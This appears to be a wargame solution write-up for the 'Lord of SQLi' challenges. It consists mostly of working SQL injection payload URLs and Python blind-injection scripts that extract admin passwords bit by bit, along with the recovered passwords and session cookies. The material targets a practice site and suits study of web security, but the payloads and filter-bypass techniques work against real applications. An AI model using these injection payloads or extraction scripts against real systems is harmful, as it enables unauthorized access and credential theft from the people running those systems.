# Lord of SQLi



## Gremlin
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Gremlin.png)
Solution:

Using ?id=1&pw=1%27%20or%201%23 would result the query execute.

query : select id from prob_gremlin where id='1' and pw='1' or 1#'

link: https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=1&pw=1%27%20or%201%23

## Cobolt

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Cobolt.png)

query : select id from prob_cobolt where id='' or id='admin' #' and pw=md5('')

link:https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=%27%20or%20id=%27admin%27%20%23

## Goblin

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Goblin.png)

query : select id from prob_goblin where id='guest' and no=1 or 1 limit 1,1

link: https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=1%20or%201%20limit%201,1#


## Orc
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orc.png)


Script:

                import requests
                url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
                header={"Cookie":"PHPSESSID=3rrijviseh2kgti5bc5st8ov7u"}
                sess=requests.session()

                payload="?pw=' or id='admin' and length(pw)="
                for i in range(1,100):
                    pay=url+payload+str(i)+"%23"
                    x=sess.get(pay,headers=header)
                    print("Check:",i,end=" ")
                    
                    if "Hello admin" in x.text:
                        length=i
                        break
                    else:
                        print("Fail")
                print("Success\nlength:",length)

                wordlist="qwertyuiopasdfghjklzxcvbnm1234567890"
                payload="?pw=' or id='admin' and substr(pw,"
                password=''
                for i in range(1,length+1):
                    print("check:",i,end="")
                    for j in range(len(wordlist)):
                        pay=url+payload+str(i)+",1)="+wordlist[j]+"%23"
                        x=sess.get(pay,headers=header)
                        if "Hello admin" in x.text:
                            password+=wordlist[j]
                            print("pass:",wordlist[j])
                            break
                print("Password:"+password)
                
                

Output:

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orcans.png)

Try the password in the url by setting it to the argument 'pw'

like:  ?pw=09509852

## Wolfman

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Wolfman.png)

link: https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%09or%09id=%27admin%27%23

query : select id from prob_wolfman where id='guest' and pw='' or id='admin'#'

## Darkelf

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkelf.png)

link: https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%20||%20id=%27admin%27%23

query : select id from prob_darkelf where id='guest' and pw='' || id='admin'#'

## Orge

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orge.png)

Script:

                    import requests
                    url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
                    header={"Cookie":"PHPSESSID=bdjvoop9fovas64ejtr7vo3m4b"}
                    sess=requests.session()

                    payload="?pw=' || id='admin' %26%26 length(pw)="
                    for i in range(1,100):
                        pay=url+payload+str(i)+"%23"
                        x=sess.get(pay,headers=header)
                        print("Check:",i,end=" ")
                        
                        if "Hello admin" in x.text:
                            length=i
                            break
                        else:
                            print("Fail")
                    print("Success\nlength:",length)


                    payload="?pw=' || id='admin' %26%26 "
                    password=''
                    for i in range(1,length+1):
                        bits=''
                        print("check:",i,end="")
                        for j in range(1,length+1):
                            pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1)=1%23"
                            x=sess.get(pay,headers=header)
                            
                            
                            if "Hello admin" in x.text:
                                bits+='1'
                            else:
                                bits+='0'
                        password+=''.join(chr(int(bits, 2)))
                        print("\t",chr(int(bits,2)))
                    print("Password:"+password)

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orgeans.png)

Try the password in the url by setting it to the argument 'pw'

like:  ?pw=7b751aec


## Troll

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Troll.png)

query : select id from prob_troll where id='a\dmin'

Link: https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=a\dmin

## Vampire

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Vampire.png)

Link: https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin

query : select id from prob_vampire where id='admin'

## Skeleton

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Skeleton.png)

query : select id from prob_skeleton where id='guest' and pw='' or id='admin'#' and 1=0

Link: https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27%20or%20id=%27admin%27%23

## Golem

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Golem.png)

Script:

                    import requests
                    url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
                    header={"Cookie":"PHPSESSID=bdjvoop9fovas64ejtr7vo3m4b"}
                    sess=requests.session()

                    payload="?pw=' || id like 'admin' %26%26 length(pw) like "
                    for i in range(1,100):
                        pay=url+payload+str(i)+"%23"
                        x=sess.get(pay,headers=header)
                        print("Check:",i,end=" ")
                        
                        if "Hello admin" in x.text:
                            length=i
                            break
                        else:
                            print("Fail")
                    print("Success\nlength:",length)


                    payload="?pw=' || id like 'admin' %26%26 "
                    password=''
                    for i in range(1,length+1):
                        bits=''
                        print("check:",i,end="")
                        for j in range(1,length+1):
                            pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1) like 1%23"
                            x=sess.get(pay,headers=header)
                            
                            
                            if "Hello admin" in x.text:
                                bits+='1'
                            else:
                                bits+='0'
                        password+=''.join(chr(int(bits, 2)))
                        print("\t",chr(int(bits,2)))
                    print("Password:"+password)


![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Golemans.png)

Try the password in the url by setting it to the argument 'pw'

like:  ?pw=77d6290b


## Darkknight

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkknight.png)

Script:

                    import requests
                    url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
                    header={"Cookie":"PHPSESSID=vrtv56j0c39a3evo84vq6p1ded"}
                    sess=requests.session()

                    payload="?no=0 or length(pw) like "
                    for i in range(1,100):
                        pay=url+payload+str(i)+"%23"
                        x=sess.get(pay,headers=header)
                        print("Check:",i,end=" ")
                        
                        if "Hello admin" in x.text:
                            length=i
                            break
                        else:
                            print("Fail")
                    print("Success\nlength:",length)


                    payload="?no=0 or length(pw) like 8 and "
                    password=''
                    for i in range(1,length+1):
                        bits=''
                        print("check:",i,end="")
                        for j in range(1,length+1):
                            pay=url+payload+"MID(lpad(bin(conv(hex(MID(pw,"+str(i)+",1)),16,10)),8,0),"+str(j)+",1) like 1%23"
                            x=sess.get(pay,headers=header)
                            
                            
                            if "Hello admin" in x.text:
                                bits+='1'
                            else:
                                bits+='0'
                        password+=''.join(chr(int(bits, 2)))
                        print("\t",chr(int(bits,2)))
                    print("Password:"+password)


![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Darkknightans.png)

Try the password in the url by setting it to the argument 'pw'

like:  ?pw=0b70ea1f


